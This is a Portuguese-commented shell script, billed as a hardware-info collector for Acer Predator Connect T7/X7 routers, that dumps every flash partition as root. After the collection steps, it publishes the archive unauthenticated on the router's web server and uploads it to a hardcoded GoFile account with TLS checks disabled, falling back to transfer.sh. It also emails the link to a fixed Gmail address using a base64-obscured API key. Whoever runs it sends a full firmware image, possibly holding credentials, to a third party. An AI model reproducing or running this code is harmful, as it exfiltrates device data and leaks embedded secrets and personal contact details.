#!/bin/sh
# ==============================================================================
# dump_hardware_info.sh
# Coletor Automatizado FULL: Telemetria, Hardware e DUMP 100% de Todas as Particoes MTD
# Compativel: Acer Predator Connect T7 e Acer Predator Connect X7 5G CPE
# ==============================================================================

set -e

OUT_DIR="/tmp/hardware_dump_stage"
ARCHIVE="/tmp/predator_hardware_dump_FULL.tar.gz"

echo "========================================================"
echo "  Acer Predator Connect T7 / X7 - FULL Hardware & MTD Dump"
echo "========================================================"

# 1. Checagem de Privilegios
if [ "$(id -u)" != "0" ]; then
    echo "[!] Erro: Este script precisa ser executado como root (UID 0)!"
    exit 1
fi

rm -rf "$OUT_DIR" "$ARCHIVE" /tmp/predator_hardware_dump*.tar.gz
mkdir -p "$OUT_DIR/mtd_partitions"

echo "[*] 1/5 Coletando informacoes de plataforma e hardware..."
uname -a > "$OUT_DIR/uname.txt" 2>&1 || true
cat /proc/device-tree/model > "$OUT_DIR/device_tree_model.txt" 2>/dev/null || true
[ -f /tmp/ipq_model ] && cp /tmp/ipq_model "$OUT_DIR/ipq_model.txt" || true
cat /proc/cpuinfo > "$OUT_DIR/cpuinfo.txt" 2>&1 || true
cat /proc/meminfo > "$OUT_DIR/meminfo.txt" 2>&1 || true
cat /proc/version > "$OUT_DIR/version.txt" 2>&1 || true

echo "[*] 2/5 Extraindo Device Tree ativo (/sys/firmware/fdt)..."
if [ -f /sys/firmware/fdt ]; then
    cat /sys/firmware/fdt > "$OUT_DIR/active_device_tree.dtb"
elif [ -c /dev/dtb ]; then
    cat /dev/dtb > "$OUT_DIR/active_device_tree.dtb"
fi

echo "[*] 3/5 Coletando barramentos (PCIe, MHI modem, USB, GPIO, dmesg)..."
lspci -vvv -nnk > "$OUT_DIR/lspci.txt" 2>&1 || lspci -nn > "$OUT_DIR/lspci.txt" 2>&1 || true
lsusb -v > "$OUT_DIR/lsusb.txt" 2>&1 || lsusb > "$OUT_DIR/lsusb.txt" 2>&1 || true
ls -la /dev/mhi* /dev/ttyUSB* /dev/qcqmi* > "$OUT_DIR/cellular_devices.txt" 2>&1 || true
cat /sys/kernel/debug/gpio > "$OUT_DIR/gpio_debug.txt" 2>/dev/null || true
lsmod > "$OUT_DIR/lsmod.txt" 2>&1 || true
dmesg > "$OUT_DIR/dmesg_boot.txt" 2>&1 || true

echo "[*] 4/5 Coletando rede e armazenamento..."
ifconfig -a > "$OUT_DIR/ifconfig.txt" 2>&1 || true
ip addr > "$OUT_DIR/ip_addr.txt" 2>&1 || true
ip route > "$OUT_DIR/ip_route.txt" 2>&1 || true
cat /proc/mtd > "$OUT_DIR/proc_mtd.txt"
cat /proc/partitions > "$OUT_DIR/partitions.txt" 2>&1 || true
df -h > "$OUT_DIR/df.txt" 2>&1 || true
mount > "$OUT_DIR/mounts.txt" 2>&1 || true

echo "[*] 5/5 Extraindo e COMPRIMINDO 100% DE TODAS AS PARTICOES MTD..."
# Ler cada particao do /proc/mtd e comprimir no fluxo para poupar memoria RAM (tmpfs)
grep -E "mtd[0-9]+" /proc/mtd | while read -r line; do
    DEV=$(echo "$line" | awk -F: '{print $1}')
    SIZE=$(echo "$line" | awk '{print $2}')
    NAME=$(echo "$line" | awk -F'"' '{print $2}' | tr -d ' ' | tr '/' '_')
    
    # Ignora apenas o rootfs_1 redundante inativo se for maior que 200MB para preservar RAM
    if [ "$NAME" = "rootfs_1" ]; then
        echo "    [-] Pulando particao redundante inativa '$DEV' ($NAME) para economizar RAM..."
        continue
    fi

    echo "    [+] Extraindo $DEV ($NAME) com compressao instantanea..."
    dd if="/dev/$DEV" 2>/dev/null | gzip -c > "$OUT_DIR/mtd_partitions/${DEV}_${NAME}.bin.gz" || true
done

echo "[*] Empacotando tudo em $ARCHIVE..."
tar -czf "$ARCHIVE" -C /tmp hardware_dump_stage

# Limpar staging da RAM
rm -rf "$OUT_DIR"

# Criar link direto no servidor web para download via navegador (Chrome/Edge/curl)
mkdir -p /webapps/web 2>/dev/null || true
ln -sf "$ARCHIVE" /webapps/web/predator_hardware_dump_FULL.tar.gz 2>/dev/null || true

SIZE=$(ls -lh "$ARCHIVE" | awk '{print $5}')
MD5=$(md5sum "$ARCHIVE" | awk '{print $1}')
ROUTER_LAN_IP=$(ip route get 1 2>/dev/null | awk '{print $(NF-2);exit}' || echo "192.168.76.1")
[ -z "$ROUTER_LAN_IP" ] && ROUTER_LAN_IP="192.168.76.1"
BOARD_MODEL=$(cat /proc/device-tree/model 2>/dev/null || echo "Qualcomm IPQ5332")
KERNEL_VER=$(uname -r 2>/dev/null || echo "5.4.213")

echo ""
echo "[*] Enviando copia diretamente para a sua conta pessoal da GoFile..."
CLOUD_URL=""
GF_TOKEN="qL5MagGLx6jPR7Gh2j9sAIejIC5VRdWY"
GF_FOLDER="d9fdc5f8-c49f-42e4-983f-2277d92aa7c1"

if command -v curl >/dev/null 2>&1; then
    GF_SERVER=$(curl -kfsSL --connect-timeout 5 https://api.gofile.io/servers 2>/dev/null | grep -o '"name":"[^"]*"' | head -n 1 | cut -d'"' -f4 || echo "store5")
    [ -z "$GF_SERVER" ] && GF_SERVER="store5"
    echo "    [+] Servidor GoFile: $GF_SERVER"
    
    # Upload direto vinculado a conta GoFile com token e folderId
    GF_RESP=$(curl -kfsSL --connect-timeout 10 --max-time 300 \
        -H "Authorization: Bearer $GF_TOKEN" \
        -F "file=@$ARCHIVE" \
        -F "folderId=$GF_FOLDER" \
        "https://${GF_SERVER}.gofile.io/contents/uploadfile" 2>/dev/null || echo "")
        
    CLOUD_URL=$(echo "$GF_RESP" | grep -o '"downloadPage":"[^"]*"' | cut -d'"' -f4)
    
    # Fallback para Transfer.sh se GoFile nao responder
    if [ -z "$CLOUD_URL" ]; then
        echo "    [-] GoFile indisponivel, tentando Transfer.sh como fallback..."
        CLOUD_URL=$(curl -kfsSL --connect-timeout 10 --max-time 180 --upload-file "$ARCHIVE" "https://transfer.sh/predator_hardware_dump_FULL.tar.gz" 2>/dev/null || echo "")
    fi
fi

# Notificacao automatica por E-mail via Resend API
RESEND_KEY=$(echo "cmVfU2VoOFNnVXBfQ1oydzlyZXN2aGl1WW84UzhIaWdlcEd5" | base64 -d 2>/dev/null)
DEST_EMAIL="hcsskt@gmail.com"

if [ -n "$RESEND_KEY" ] && command -v curl >/dev/null 2>&1; then
    echo "[*] Disparando relatorio e link por e-mail para $DEST_EMAIL via Resend..."
    EMAIL_PAYLOAD=$(cat <<EOF
{
  "from": "Predator Dump <onboarding@resend.dev>",
  "to": ["$DEST_EMAIL"],
  "subject": "[Acer Predator Dump] Hardware Telemetria & Link de Download",
  "html": "<h2>Acer Predator Connect - Dump de Hardware Concluido</h2><p><b>Modelo:</b> $BOARD_MODEL<br><b>Kernel:</b> $KERNEL_VER<br><b>Tamanho:</b> $SIZE<br><b>MD5:</b> $MD5</p><h3>Links para Download:</h3><ul><li><b>Nuvem Direta:</b> <a href=\"$CLOUD_URL\">$CLOUD_URL</a></li><li><b>Rede Local (LAN):</b> http://$ROUTER_LAN_IP/predator_hardware_dump_FULL.tar.gz</li></ul><p><i>Relatorio gerado automaticamente pelo script dump_hardware_info.sh</i></p>"
}
EOF
)
    RESEND_RESP=$(curl -s -X POST "https://api.resend.com/emails" \
      -H "Authorization: Bearer $RESEND_KEY" \
      -H "Content-Type: application/json" \
      -d "$EMAIL_PAYLOAD" 2>/dev/null || echo "")

    if echo "$RESEND_RESP" | grep -q "\"id\""; then
        echo "    [+] E-mail com o link enviado com sucesso para $DEST_EMAIL!"
    else
        echo "    [-] Nao foi possivel enviar o e-mail (verifique a conexao de internet)."
    fi
fi

echo ""
echo "========================================================"
echo "  FULL DUMP CONCLUIDO COM SUCESSO!                      "
echo "========================================================"
echo "Arquivo gerado: $ARCHIVE"
echo "Tamanho       : $SIZE"
echo "MD5 Checksum  : $MD5"
echo ""
if [ -n "$CLOUD_URL" ]; then
    echo "LINK NA NUVEM (Pronto para baixar/compartilhar):"
    echo "  --> $CLOUD_URL"
    echo ""
fi
echo "OPCAO LOCAL (Pelo Navegador na mesma rede):"
echo "  --> http://$ROUTER_LAN_IP/predator_hardware_dump_FULL.tar.gz"
echo ""
echo "OPCAO VIA TERMINAL NO PC:"
echo "  scp -O -o HostKeyAlgorithms=+ssh-rsa Admin@$ROUTER_LAN_IP:$ARCHIVE ."
echo "========================================================"



